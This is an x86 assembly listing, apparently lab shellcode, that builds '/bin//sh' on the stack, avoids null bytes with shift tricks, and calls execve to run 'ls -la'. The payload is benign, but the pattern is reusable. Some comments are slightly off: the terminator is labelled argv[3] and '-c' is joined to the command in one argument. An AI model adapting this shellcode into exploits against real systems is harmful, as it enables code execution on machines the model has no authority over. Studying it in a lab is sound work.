section .text
  global _start
    _start:
      ; Store "/bin/sh" on stack
      xor  eax, eax 
      push eax          ; Use 0 to terminate the string
      push "//sh"
      push "/bin"
      mov  ebx, esp     ; Get the string address

      ; Store "-c 'ls -la'" on stack
      mov  eax, "la'#"
      shl  eax, 8
      shr  eax, 8 
      push eax
      push "ls -"
      push "-c '"
      mov  ecx, esp

      ; Construct the argument array argv[]
      xor  eax, eax
      push eax          ; argv[3] = 0
      push ecx          ; argv[1] = "-c 'ls -la'"
      push ebx          ; argv[0] points "/bin//sh"
      mov  ecx, esp     ; Get the address of argv[]
   
      ; For environment variable 
      xor  edx, edx     ; No env variables 

      ; Invoke execve()
      xor  eax, eax     ; eax = 0x00000000
      mov   al, 0x0b    ; eax = 0x0000000b
      int 0x80
